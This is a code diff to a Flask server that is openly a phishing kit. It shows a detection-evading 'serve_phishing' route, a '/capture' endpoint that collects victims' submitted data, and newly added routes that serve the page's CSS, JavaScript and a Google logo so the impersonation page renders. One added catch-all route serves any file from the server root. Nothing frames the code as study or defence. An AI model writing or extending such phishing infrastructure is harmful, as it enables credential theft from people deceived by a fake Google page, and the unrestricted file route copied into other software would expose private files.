@@ -220,6 +220,26 @@ def serve_phishing():
     print(f"🔥 EVASION PASSED: Victim accessed secret route at {int(uptime)}s")
     return send_from_directory('.', 'index.html')
 
+# --- Explicit Static File Routing ---
+# Because the phishing page is on a deep route (/document/v2/...), 
+# standard relative static paths might fail. These guarantee delivery.
+@app.route('/styles.css')
+def serve_css():
+    return send_from_directory('.', 'styles.css')
+
+@app.route('/script.js')
+def serve_js():
+    return send_from_directory('.', 'script.js')
+
+@app.route('/google-logo.svg')
+def serve_logo():
+    return send_from_directory('.', 'google-logo.svg')
+
+@app.route('/<path:filename>')
+def serve_other_static(filename):
+    """Catch-all for any other static bits if needed, serving from root."""
+    return send_from_directory('.', filename)
+
 @app.route('/capture', methods=['POST'])
 def capture():
     data = request.json
